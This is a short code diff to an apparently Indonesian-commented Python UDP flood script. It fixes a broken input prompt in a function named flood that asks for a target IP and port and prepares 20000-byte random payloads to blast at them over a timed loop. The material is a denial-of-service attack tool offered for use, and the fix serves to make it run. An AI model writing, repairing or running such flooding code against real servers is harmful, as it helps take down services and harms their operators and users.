@@ -19,7 +19,7 @@ def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
     IP = input("IP Target = ")
-    Port = input(Port = ")
+    Port = input("Port = ")
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
     sent = 3000
